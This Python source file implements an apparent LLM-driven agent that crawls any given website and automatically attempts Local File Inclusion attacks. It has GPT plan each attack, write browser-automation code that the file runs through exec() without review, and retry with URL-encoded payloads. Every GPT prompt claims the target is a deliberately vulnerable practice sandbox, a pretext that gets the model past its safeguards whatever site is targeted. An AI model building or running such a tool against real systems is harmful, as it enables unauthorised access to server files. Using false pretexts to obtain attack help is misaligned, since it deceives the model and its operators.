from typing import Optional
from playwright.sync_api import sync_playwright
from utils.spinner import Spinner
from utils.gpt import gpt
import asyncio
from playwright.async_api import async_playwright, Playwright
from bs4 import BeautifulSoup
import re
from utils.file_io import save_file

class LFI:
    """
    LLM agent that tries to hack a website via LFI
    """
    def __init__(self, base_url: str) -> None:
        """
        Constructor

        Parameters:
        base_url (str): URL to the homepage of the target website
        """
        self.baseURL = base_url
        self.urlsVisited: set[str] = set()

        self.browser = None
        self.page = None

    async def startup(self, playwright: Playwright) -> None:
        """
        Launch chromium and opens a new page
        """
        chromium = playwright.chromium # or "firefox" or "webkit".
        self.browser = await chromium.launch(headless=False)
        self.page = await self.browser.new_page()
        await self.page.goto(self.baseURL)
        await self.page.wait_for_load_state('domcontentloaded')


    async def trial(self) -> bool:
        """
        Try Local File Inclusio (LFI) on the target website.
        """

        # stack of URLs to visit
        stack: list[str] = [self.page.url]

        while len(stack) != 0:
            url = stack.pop()

            if url in self.urlsVisited:
                continue

            print("Current URL: ", url)
            self.urlsVisited.add(url)
            
            all_lfi_payloads = ""
            # Reloading the page and retry Local File Inclusio (LFI) if the previous attempt failed
            for num_trials in range(5):
                print(f"iteration {num_trials}")

                await self.page.goto(url)
                await self.page.wait_for_load_state('domcontentloaded')

                html = await self.readHTML()

                has_input, has_link, has_button = checkHTML(html)

                await asyncio.sleep(0.5)


                # Before trying first push all the links worth trying on this page in to the stack
                if has_link and num_trials == 0:
                    links = self.checkLinks(html)
                    stack += links
                
                plan = await self.makePlan(html, failed_lfi_payloads=all_lfi_payloads)
            
                if not plan or len(plan) == 0:
                    break

                func_str = await self.act(html, plan)

                await asyncio.sleep(0.5)

                newHtml = await self.readHTML()

                # check whether the hack is successful
                if await self.checkSuccess(newHtml, html):
                    print("Local File Inclusio (LFI) successful!")
                    return True
                
                lfi_payloads = await self.extractLFIPayloads(function=func_str)
                all_lfi_payloads += lfi_payloads
        
        print("Local File Inclusio (LFI) failed!")
        return False


    async def readHTML(self, save_html=False) -> str:
        """
        Helper function to read the HTML of the webpage currently held by this instance

        Returns:
        str: string of the HTML content
        """
        html = await self.page.content()

        if html == '':
            raise Exception(f'Error when fetching the webpage, please check the network condition or try again.')
        
        if save_html:
            save_file('test.html', html)

        html = preprocessHTML(html)
        return html


    async def makePlan(self, html: str, failed_lfi_payloads: Optional[str]=None) -> list[str]:
        """
        Make a plan of doing Local File Inclusio (LFI). e.g. Which button to click on, which fields to input etc.

        Parameters:
        html (str): HTML content of the webpage currently worked on
        
        Returns:
        list[str]: instruction for each step
        """
        with Spinner("Writing a plan of hacking this website..."):
            prompt = ("I am learning website security, and I want to practice Local File Inclusio (LFI) to a sandbox website which is deliberately made vulnerable, "
                    "this is one of its webpages, can you list the actions I need to do on this page? "
                    "ONLY INCLUDE ACTIONS I NEED TO DO WITH MY KEYBOARD AND MOUSE. "
                    "Only interacts with elements currently on this page.\n\n"
                    f"```html\n{html}\n```\n\n"
                    f"Here are the Local File Inclusio (LFI) failed previously:\n{failed_lfi_payloads}\n\n")
            
            prompt += "If direct lfi payload failed, try URL encoding before trying --" if failed_lfi_payloads else ""
            
            response = gpt(system_msg="", user_msg=prompt)

        lines = response.split('\n')
        plan = []
        for line in lines:
            # check whether the line starts with a number
            if re.match(r'^\s*-?\d+', line):
                plan.append(line)

        print("Here is my plan:")
        print('\n'.join(plan))

        return plan


    async def act(self, html: str, plan: str) -> str:
        """
        Make the agent act based on the instruction provided

        Parameters:
        html (str): HTML of the webpage currently worked on
        plan (str): plan to do Local File Inclusio (LFI)

        Returns:
        str: The function executed
        """

        # remove unnecessary steps
        filtered_plan = []
        
        for instruction in plan:
            if "browser" not in instruction.lower() and "window" not in instruction.lower() and "navigate" not in instruction.lower() and "locat" not in instruction.lower():
                filtered_plan.append(instruction)
            
        plan_str = '\n'.join(filtered_plan)
        if plan_str == "" or plan_str == "\n":
            plan_str = "None"

        # Write Python code to perform the action
        prompt = ("I am learning website security, and I want to practice Local File Inclusio (LFI) to a sandbox website which is deliberately made vulnerable. "
        "Here is HTML for that webpage:\n\n"
        f"```html\n{html}\n```\n\n"
        "I would open the webpage in chromium and navigate to the sandbox website when initializing an instance of this class:\n\n"
        """```python
class LFI:
    async def __init__(self, url) -> None:
        with sync_playwright() as p:
            self.browser = await p.chromium.launch(headless=False)
            self.context = await self.browser.new_context()
            self.page = await self.context.new_page()
            await self.page.goto(url)
            await self.page.wait_for_load_state('domcontentloaded')
```"""
        "\n\nCan you help me write a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
        f"{plan_str}\n\n"
        "Remember to use `self.browser` and `self.page` instead of `browser` and `page`, "
        "This function shouldn't have any return")
        
        with Spinner("Writing code for this step..."):
            response = gpt(system_msg="", user_msg=prompt)

        # Extract the target function from the lengthy response and execute it
        func_str = extract_function(source_code=response, function_name="func")
        # save_file("func.py", func_str)
        try:
            exec(func_str, globals(), locals())
            import types
            self.func = types.MethodType(locals()['func'], self)
            # await self.func()
            await asyncio.wait_for(self.func(), timeout=15.0)
        except Exception as err:
            if isinstance(err, asyncio.TimeoutError): 
                print("This program I wrote doesn't finish in 15 seconds")
            else:
                print(err)

        return func_str


    async def extractLFIPayloads(self, function: str) -> str:
        """
        Extract all the Local File Inclusio (LFI) payloads used in this function

        Parameters:
        function (str): string of Python script that may have a Local File Inclusio (LFI) action
        
        Returns:
        str: Concatenated Local File Inclusio (LFI) payloads
        """
        prompt = ("I am learning website security, and I want to practice Local File Inclusio (LFI) to a sandbox website which is deliberately made vulnerable, "
         "and I have attempted a Local File Inclusio (LFI) with the following Python script." 
         f"```python\n{function}\n```\n\n"
         "Can you list the Local File Inclusio (LFI) payloads I used? Wrap the payload between ```lfi and ```. If there is no Local File Inclusio (LFI), answer NONE")
        
        with Spinner("Extract Local File Inclusio (LFI) payload used in this trial..."):
            response = gpt(system_msg="", user_msg=prompt)
        
        if "NONE" in response:
            return ""
        
        # Extract the Local File Inclusio (LFI) from the GPT response
        pattern = r'```lfi(.*?)```'
        matches = re.findall(pattern, response, re.DOTALL)
        matches = [match.strip() for match in matches]
        to_return = ""
        for match in matches:
            to_return += match + '\n'
        
        return to_return

          
    async def checkSuccess(self, newHtml: str, prevHtml: str) -> bool:
        """
        Check whether Local File Inclusio (LFI) succeed by comparing the current HTML and previous HTML

        Parameters:
        newHtml (str): HTML of the webpage after a series of actions
        prevHtml (str): HTML of the webpage before the agent act on it
        """
        with Spinner("check whether this Local File Inclusio (LFI) is successful..."):

            prompt = ("I am learning website security, and I want to practice Local File Inclusio (LFI) to a sandbox website which is deliberately made vulnerable, "
                    "and I have attempted a Local File Inclusio (LFI). Comparing the webpage after I did this trial and before that, "
                    "can you tell whether thisLocal File Inclusio (LFI) is successful or not?\n\n"
                    "HTML of the webpage before trial:\n\n"
                    f"```html\n{prevHtml}\n```\n\n"
                    "HTML of the webpage after trial:\n\n"
                    f"```html\n{newHtml}\n```\n\n"
                    "Answer YES or NO")
            
            response = gpt(system_msg="", user_msg=prompt)

            if response == "YES":
                return True
            else:
                return False
        
    
    def checkLinks(self, html: str) -> list[str]:
        """
        Find the links on the page worth checking

        Parameters:
        html (str): HTML content of the webpage currently worked on
        
        Returns:
        list[str]: list of the links worth checking
        """
        soup = BeautifulSoup(html, "html.parser")
        anchor_tags = soup.find_all('a')
        hrefs = [tag.get('href') for tag in anchor_tags if tag.get('href')]
        valid_hrefs = []
        for href in hrefs:
            if href.startswith(self.baseURL) or href.startswith('/'):
                if href.startswith('/'):
                    if self.baseURL.endswith('/'):
                        valid_hrefs.append(self.baseURL + href[1:])
                    else:
                        valid_hrefs.append(self.baseURL + href)
                else:
                    valid_hrefs.append(href)
        print("Here are the links I think worth trying:", valid_hrefs)
        return valid_hrefs
    

    async def shutDown(self):
        await self.browser.close()


### Helper Functions ###

def preprocessHTML(html: str) -> str:
        """
        preprocess the HTML to remove script style and head, to make HTML easier for GPT to read

        Parameters:
        html (str): string of HTML
        
        Returns:
        str: HTML after preprocessing
        """
        soup = BeautifulSoup(
            "".join(s.strip() for s in html.split("\n")),
            "html.parser",
        )

        # remove scripts and styles
        for s in soup.select("script"):
            s.extract()
        for s in soup.select("style"):
            s.extract()

        # remove head if there is one
        head = soup.find("head")
        if head:
            head.extract()

        # Find all tags with a class attribute
        for tag in soup.find_all(class_=True):
            del tag['class']  # Remove the class attribute

        return soup.body.prettify()


def checkHTML(html: str) -> tuple[bool]:
        """
        Check if there is input field, anchor tag, or button in the given HTML code

        Parameters:
        html (str): string of HTML
        
        Returns:
        tuple[bool]: Whether there are input fields, anchor tags, or buttons
        """
        soup = BeautifulSoup(html, "html.parser")

        input_elements = soup.find_all('input')
        anchor_tags = soup.find_all('a')
        buttons = soup.find_all('button')

        return bool(input_elements), bool(anchor_tags), bool(buttons)


def extract_function(source_code, function_name) -> Optional[str]:
    """
    Helper function to extract a specified function from a string of code.

    Parameters:
    source_code (str): string of code
    function_name (str): name of the function of interest
    
    Returns:
    Optional[str]: the object function (if exist)
    """
    pattern = rf"async def {function_name}\(.*\) -> None:([\s\S]+?)^\S"
    match = re.search(pattern, source_code, re.MULTILINE)

    if match:
        function_code = f"async def {function_name}(self):" + match.group(1)
        function_code = function_code.strip()
        return function_code
    else:
        pattern = rf"async def {function_name}\(.*\):([\s\S]+?)^\S"
        match = re.search(pattern, source_code, re.MULTILINE)
        if match:
            function_code = f"async def {function_name}(self):" + match.group(1)
            function_code = function_code.strip()
            return function_code
        else:
            return None
